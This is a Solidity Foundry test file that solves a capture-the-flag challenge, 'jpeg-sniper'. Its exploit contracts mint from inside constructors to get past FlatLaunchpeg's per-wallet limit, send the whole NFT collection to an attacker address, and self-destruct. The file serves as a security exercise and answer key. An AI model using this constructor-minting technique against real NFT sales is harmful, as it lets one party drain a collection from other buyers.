// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// utilities
import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
// core contracts
import {FlatLaunchpeg} from "src/jpeg-sniper/FlatLaunchpeg.sol";

contract Exploit {
    constructor(address _target, address attacker){
        FlatLaunchpeg target = FlatLaunchpeg(_target);
        uint256 totalSupply = target.collectionSize();
        uint256 maxPerWallet = target.maxPerAddressDuringMint();
        uint256 interactions = totalSupply/maxPerWallet;
        uint indexCount;

        for(uint256 i = 0; i< interactions+1; i++){
            if(totalSupply - indexCount < maxPerWallet){
                new NewExploit(target, totalSupply-indexCount, attacker, indexCount);
                break;
            }
            new NewExploit(target, maxPerWallet, attacker, indexCount);
            indexCount +=maxPerWallet;
        }
    }
}

contract NewExploit{

    constructor(FlatLaunchpeg target, uint256 maxPerWallet, address attacker, uint256 indexCount){
        (bool success, ) = address(target).call(abi.encodeWithSignature("publicSaleMint(uint256)", maxPerWallet));
        require(success);
        for (uint i=0; i < maxPerWallet;i++){
            target.transferFrom(address(this), attacker, indexCount+i  );
        }
        selfdestruct(payable(attacker));
    }
}


contract Testing is Test {

    address attacker = makeAddr('attacker');
    address o1 = makeAddr('o1');
    address o2 = makeAddr('o2');
    address admin = makeAddr('admin'); // should not be used
    address adminUser = makeAddr('adminUser'); // should not be used

    FlatLaunchpeg flatLaunchpeg;

    /// preliminary state
    function setUp() public {

        // funding accounts
        vm.deal(admin, 10_000 ether);
        vm.deal(attacker, 10_000 ether);
        vm.deal(adminUser, 10_000 ether);

        // deploying core contracts
        vm.prank(admin);
        flatLaunchpeg = new FlatLaunchpeg(69,5,5);

    }

    /// solves the challenge
    function testChallengeExploit() public {
        vm.startPrank(attacker,attacker);
        new Exploit(address(flatLaunchpeg), attacker);

        // implement solution here

        vm.stopPrank();
        validation();
    }

    /// expected final state
    function validation() public {

        // attacker mints out collection in one tx
        assertEq(flatLaunchpeg.totalSupply(),69);
        assertEq(flatLaunchpeg.balanceOf(attacker),69);

    }
}
